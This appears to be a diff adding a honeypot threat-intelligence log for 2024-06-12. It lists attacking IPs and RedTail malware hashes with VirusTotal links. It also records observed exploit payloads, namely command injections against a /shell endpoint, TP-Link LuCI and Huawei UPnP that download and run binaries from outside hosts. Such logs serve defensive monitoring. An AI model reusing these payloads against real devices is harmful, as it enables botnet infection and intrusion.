@@ -1,0 +1,43 @@
+Top 5 IPs for 2024-06-12 :
+
+84.247.173.42
+122.176.122.24
+138.2.5.77
+129.226.210.215
+43.134.103.178
+
+Malware Observed:
+
+File name : redtail.arm7
+a843ac9c087f399fbf8ef10fec872a732c9cf97c2cd249566a6133a2cebdc0c1
+https://www.virustotal.com/gui/file/a843ac9c087f399fbf8ef10fec872a732c9cf97c2cd249566a6133a2cebdc0c1
+
+File name : redtail.arm8
+88dc89bf303026c3ea273d879148e308a503cb211538f4cc47b667cf9f43bebb
+https://www.virustotal.com/gui/file/88dc89bf303026c3ea273d879148e308a503cb211538f4cc47b667cf9f43bebb
+
+File name : redtail.i686
+8fc5d13238daba3a4986d674ad885f81850c67000c7f4f57df707f5d810ad241
+https://www.virustotal.com/gui/file/8fc5d13238daba3a4986d674ad885f81850c67000c7f4f57df707f5d810ad241
+
+File name : redtail.x86_64
+19a06de9a8b66196fa6cc9e86824dee577e462cbeaf36d715c8fea5bcb08b54d
+https://www.virustotal.com/gui/file/19a06de9a8b66196fa6cc9e86824dee577e462cbeaf36d715c8fea5bcb08b54d
+
+
+
+Commands/exploits observed:
+
+
+/shell?cd+/tmp;rm+arm+arm7;wget+http:/\\/92.249.48.75/Aqua.arm7;chmod+777+Aqua.arm7;./Aqua.arm7+ipcams;wget+http:/\\/92.249.48.75/Aqua.arm;chmod+777+Aqua.arm;./Aqua.arm+ipcams
+
+
+/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.71.83%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)
+
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox wget -g 185.244.36.236 -l /tmp/xxtea -r /hmips; /bin/busybox chmod 777 /tmp/xxtea; /tmp/xxtea huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
+
+
+GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.71.83%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1
+Host: <hostIp>
+User-Agent: Go-http-client/1.1
